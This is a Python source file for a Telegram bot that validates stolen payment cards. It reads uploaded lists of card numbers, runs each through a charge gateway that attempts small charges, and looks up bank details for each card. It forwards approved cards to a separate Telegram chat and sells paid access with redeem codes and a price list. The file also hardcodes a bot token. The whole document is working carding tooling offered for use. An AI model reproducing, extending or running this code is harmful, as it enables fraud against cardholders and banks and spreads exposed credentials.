import requests
import telebot
import time
import random
from telebot import TeleBot, types
from telebot.types import Message
from gatet import Tele
from urllib.parse import urlparse
import sys
import time
import requests
import os
import string
import logging
import re

token = "8197979766:AAG3VLXyzu2BdNyTSlgWgqgZT224-Uo3yGY" 
bot = telebot.TeleBot(token, parse_mode="HTML")

owners = ["562735329"]
processing_starters = {}  # Track user ID per processing message

# Function to check if the user's ID is in the id.txt file
def is_user_allowed(user_id):
    try:
        with open("id.txt", "r") as file:
            allowed_ids = file.readlines()
            allowed_ids = [id.strip() for id in allowed_ids]
            return str(user_id) in allowed_ids
    except FileNotFoundError:
        print("id.txt file not found.")
    return False

def add_user(user_id):
    with open("id.txt", "a") as file:
        file.write(f"{user_id}\n")
    try:
        bot.send_message(user_id, "✅ You've been added to the authorized list.")
    except Exception as e:
        print(f"Failed to send DM to {user_id}: {e}")

def remove_user(user_id):
    try:
        with open("id.txt", "r") as file:
            allowed_ids = file.readlines()
        with open("id.txt", "w") as file:
            for line in allowed_ids:
                if line.strip() != str(user_id):
                    file.write(line)
        try:
            bot.send_message(user_id, "❌ You've been removed from the authorized list.")
        except Exception as e:
            print(f"Failed to send DM to {user_id}: {e}")
    except FileNotFoundError:
        print("id.txt file not found.")

valid_redeem_codes = []

def generate_redeem_code():
    prefix = "BLACK"
    suffix = "NUGGET"
    main_code = '-'.join(''.join(random.choices(string.ascii_uppercase + string.digits, k=4)) for _ in range(3))
    return f"{prefix}-{main_code}-{suffix}"

@bot.message_handler(commands=["code"])
def generate_code(message):
    if str(message.chat.id) == '562735329':
        new_code = generate_redeem_code()
        valid_redeem_codes.append(new_code)
        bot.reply_to(
            message, 
            f"<b>🎉 New Redeem Code 🎉</b>\n\n"
            f"<code>{new_code}</code>\n\n"
            f"<code>/redeem {new_code}</code>\n"
            f"Use this code to redeem access!",
            parse_mode="HTML"
        )
    else:
        bot.reply_to(message, "🚫 You don't have permission to generate codes.")

LOGS_GROUP_CHAT_ID = -1002732410680

@bot.message_handler(commands=["redeem"])
def redeem_code(message):
    try:
        redeem_code = message.text.split()[1]
    except IndexError:
        bot.reply_to(message, "⚠️ Please provide a redeem code. Example: /redeem BLACK-XXXX-XXXX-NUGGET")
        return

    if redeem_code in valid_redeem_codes:
        if is_user_allowed(message.chat.id):
            bot.reply_to(message, "ℹ️ You already have access.")
        else:
            add_user(message.chat.id)
            valid_redeem_codes.remove(redeem_code)
            bot.reply_to(message, f"✅ Redeem successful! Access granted.")
            
            username = message.from_user.username or "No Username"
            log_msg = (
                f"<b>🔑 Redeem Code Used</b>\n"
                f"Code: <code>{redeem_code}</code>\n"
                f"By: @{username} (ID: <code>{message.chat.id}</code>)"
            )
            bot.send_message(LOGS_GROUP_CHAT_ID, log_msg, parse_mode="HTML")
    else:
        bot.reply_to(message, "❌ Invalid redeem code.")

@bot.message_handler(commands=["start"])
def start(message):
    user_id = message.from_user.id
    if is_user_allowed(user_id):
        bot.reply_to(message, "✨ You're authorized! Send a file to begin.")
    else:
        bot.reply_to(message, """
🚫 You are not authorized!

⤿ 𝙋𝙧𝙞𝙘𝙚 𝙇𝙞𝙨𝙩 ⚡
⤿ 1 day - 249rs/3$ 
★ 7 days - 699rs/8$ 
★ 1 month - 1999rs/25$ 
★ lifetime - 3999rs/50$ 

DM @Akbhai007 to buy premium""")

@bot.message_handler(commands=["add"])
def add(message):
    if str(message.from_user.id) in owners:
        try:
            user_id_to_add = message.text.split()[1]
            add_user(user_id_to_add)
            bot.reply_to(message, f"✅ User {user_id_to_add} added.")
            
            log_msg = (
                f"<b>➕ User Added</b>\n"
                f"👤 User ID: <code>{user_id_to_add}</code>\n"
                f"👑 By: @{message.from_user.username or 'N/A'}"
            )
            bot.send_message(LOGS_GROUP_CHAT_ID, log_msg, parse_mode="HTML")
        except IndexError:
            bot.reply_to(message, "⚠️ Provide a user ID: /add <user_id>")
    else:
        bot.reply_to(message, "🚫 Unauthorized.")

@bot.message_handler(commands=["remove"])
def remove(message):
    if str(message.from_user.id) in owners:
        try:
            user_id_to_remove = message.text.split()[1]
            remove_user(user_id_to_remove)
            bot.reply_to(message, f"❌ User {user_id_to_remove} removed.")
            
            log_msg = (
                f"<b>➖ User Removed</b>\n"
                f"👤 User ID: <code>{user_id_to_remove}</code>\n"
                f"👑 By: @{message.from_user.username or 'N/A'}"
            )
            bot.send_message(LOGS_GROUP_CHAT_ID, log_msg, parse_mode="HTML")
        except IndexError:
            bot.reply_to(message, "⚠️ Provide a user ID: /remove <user_id>")
    else:
        bot.reply_to(message, "🚫 Unauthorized.")
        
@bot.message_handler(commands=["info"])
def user_info(message):
    user_id = message.chat.id
    first_name = message.from_user.first_name or "N/A"
    last_name = message.from_user.last_name or "N/A"
    username = message.from_user.username or "N/A"
    profile_link = f"<a href='tg://user?id={user_id}'>Profile</a>"

    status = "Owner 👑" if str(user_id) in owners else "Authorised ✅" if is_user_allowed(user_id) else "Not-Authorised ❌"

    response = (
        f"🔍 <b>Your Info</b>\n"
        f"━━━━━━━━━━━━━━\n"
        f"👤 First Name: {first_name}\n"
        f"👤 Last Name: {last_name}\n"
        f"🆔 ID: <code>{user_id}</code>\n"
        f"📛 Username: @{username}\n"
        f"🔗 Profile: {profile_link}\n"
        f"📋 Status: {status}"
    )
    bot.reply_to(message, response, parse_mode="HTML")

@bot.message_handler(content_types=["document"])
def main(message):
    if not is_user_allowed(message.from_user.id):
        bot.reply_to(message, "🚫 Unauthorized. DM @Akbhai007 for access.")
        return
        
    dd, live, ch = 0, 0, 0
    ko = bot.reply_to(message, "🔍 Checking your cards...").message_id
    username = message.from_user.username or "N/A"
    ee = bot.download_file(bot.get_file(message.document.file_id).file_path)
    
    with open("combo.txt", "wb") as w:
        w.write(ee)
    
    start_time = time.time()
    
    # Create unique stop file for this process
    stop_file = f"stop_{message.from_user.id}_{ko}.stop"
    processing_starters[ko] = message.from_user.id  # Track starter user

    try:
        with open("combo.txt", 'r') as file:
            lino = file.readlines()
            total = len(lino)
            if total > 2001:
                bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=f"⚠️ File exceeds 2000 CC limit ({total} found).")
                return
                
            for cc in lino:
                # Check if this specific process should stop
                if os.path.exists(stop_file):
                    bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='⏹️ STOPPED\n➜ @Akbhai007')
                    break
                    
                try:
                    data = requests.get(f'https://bins.antipublic.cc/bins/{cc[:6]}').json()
                except:
                    data = {}
                    
                bank = data.get('bank', 'N/A')
                brand = data.get('brand', 'N/A')
                emj = data.get('country_flag', 'N/A')
                cn = data.get('country_name', 'N/A')
                dicr = data.get('level', 'N/A')
                typ = data.get('type', 'N/A')
                
                mes = types.InlineKeyboardMarkup(row_width=1)
                mes.add(
                    types.InlineKeyboardButton(f"• {cc} •", callback_data='u8'),
                    types.InlineKeyboardButton(f"• Charged ✅: {ch} •", callback_data='x'),
                    types.InlineKeyboardButton(f"• CCN ✅ : {live} •", callback_data='x'),
                    types.InlineKeyboardButton(f"• DEAD ❌ : {dd} •", callback_data='x'),
                    types.InlineKeyboardButton(f"• TOTAL 👻 : {total} •", callback_data='x'),
                    types.InlineKeyboardButton(" STOP 🛑 ", callback_data='stop')
                )
                bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='Processing...', reply_markup=mes)
                
                try:
                    last = str(Tele(cc))
                except Exception as e:
                    last = "Card declined."
                
                elapsed_time = time.time() - start_time
                msg_template = f"""
{'✅ APPROVED' if 'requires_action' in last or 'succeeded' in last else '❌ DECLINED'}

💳 Card: {cc}
⏱️ Time: {elapsed_time:.2f}s
📊 Status: {'Charged $1' if 'succeeded' in last else 'VBV/CVV' if 'requires_action' in last else 'Declined'}

🏦 Bank: {bank} ({brand})
🌍 Country: {cn} {emj}
💳 Type: {typ} {dicr}

👤 Checked By: @{username}
➜ @Akbhai007 
"""
                if "requires_action" in last or "Your card is not supported." in last or "Your card's security code is incorrect." in last:
                    live += 1
                    send_telegram_notification(msg_template)
                    bot.reply_to(message, msg_template)
                elif "succeeded" in last:
                    ch += 1
                    send_telegram_notification(msg_template)
                    bot.reply_to(message, msg_template)
                else:
                    dd += 1
                    
                # Throttle every 50 cards
                if (ch + live + dd) % 50 == 0:
                    bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text="⏱️ Taking a 60s break...")
                    time.sleep(60)
                    
    except Exception as e:
        print(f"Error: {e}")
    finally:
        # Cleanup
        if os.path.exists(stop_file):
            os.remove(stop_file)
        if ko in processing_starters:
            del processing_starters[ko]
            
    bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text=f"""
✅ PROCESS COMPLETE

Charged: {ch}
CCN: {live}
Dead: {dd}
Total: {total}

➜ @Akbhai007""")

@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def stop_callback(call):
    user_id = call.from_user.id
    msg_id = call.message.message_id
    
    if msg_id in processing_starters:
        if user_id == processing_starters[msg_id]:
            stop_file = f"stop_{user_id}_{msg_id}.stop"
            open(stop_file, 'w').close()  # Create stop file
            bot.answer_callback_query(call.id, "⏹️ Processing will stop.")
        else:
            bot.answer_callback_query(call.id, "🚫 Only the user who started this can stop it.", show_alert=True)
    else:
        bot.answer_callback_query(call.id, "ℹ️ No active process found.")

@bot.message_handler(commands=["show_auth_users", "sau", "see_list"])
def show_auth_users(message):
    if str(message.from_user.id) in owners:
        try:
            with open("id.txt", "r") as file:
                allowed_ids = file.readlines()
            if not allowed_ids:
                bot.reply_to(message, "No authorized users.")
                return
                
            user_list = "Authorized Users:\n\n"
            for uid in allowed_ids:
                uid = uid.strip()
                try:
                    user = bot.get_chat(uid)
                    username = f"@{user.username}" if user.username else "NoUsername"
                    user_list += f"• {username} (ID: {uid})\n"
                except:
                    user_list += f"• ID: {uid} (Unreachable)\n"
            bot.reply_to(message, user_list)
        except FileNotFoundError:
            bot.reply_to(message, "id.txt not found.")
    else:
        bot.reply_to(message, "🚫 Unauthorized.")

# Group-specific command
allowed_group = -1002732410680
last_used = {}

@bot.message_handler(commands=["chk"])
def chk(message):
    if message.chat.id != allowed_group:
        bot.reply_to(message, "⚠️ Use this in @Akbhai007 group.")
        return
        
    user_id = message.from_user.id
    current_time = time.time()
    
    # Cooldown check
    if user_id in last_used and current_time - last_used[user_id] < 25:
        remaining = int(25 - (current_time - last_used[user_id]))
        bot.reply_to(message, f"⏳ Wait {remaining}s before using again.")
        return
    last_used[user_id] = current_time
    
    try:
        cc = message.text.split('/chk ')[1].strip()
    except IndexError:
        bot.reply_to(message, "⚠️ Format: /chk <card_number>")
        return
        
    username = message.from_user.username or "N/A"
    init_msg = bot.reply_to(message, "⏳ Checking card...")
    
    # Process card
    try:
        last = str(Tele(cc))
    except Exception as e:
        last = f"Error: {str(e)}"
    
    # Fetch BIN data
    try:
        bin_data = requests.get(f'https://bins.antipublic.cc/bins/{cc[:6]}').json()
    except:
        bin_data = {}
    
    # Prepare response
    status = "APPROVED ✅" if "succeeded" in last or "requires_action" in last else "DECLINED ❌"
    info = (
        f"{status}\n\n"
        f"💳 Card: {cc}\n"
        f"🏦 Bank: {bin_data.get('bank', 'N/A')}\n"
        f"🌍 Country: {bin_data.get('country_name', 'N/A')} {bin_data.get('country_flag', '')}\n"
        f"🔍 BIN Info: {bin_data.get('brand', 'N/A')} {bin_data.get('type', 'N/A')}\n\n"
        f"👤 Checked By: @{username}\n"
        f"➜ @Akbhai007"
    )
    bot.edit_message_text(info, chat_id=message.chat.id, message_id=init_msg.message_id)

def send_telegram_notification(msg):
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    data = {'chat_id': -1002839621564, 'text': msg, 'parse_mode': 'HTML'}
    requests.post(url, data=data)

print("Bot running...")
bot.infinity_polling()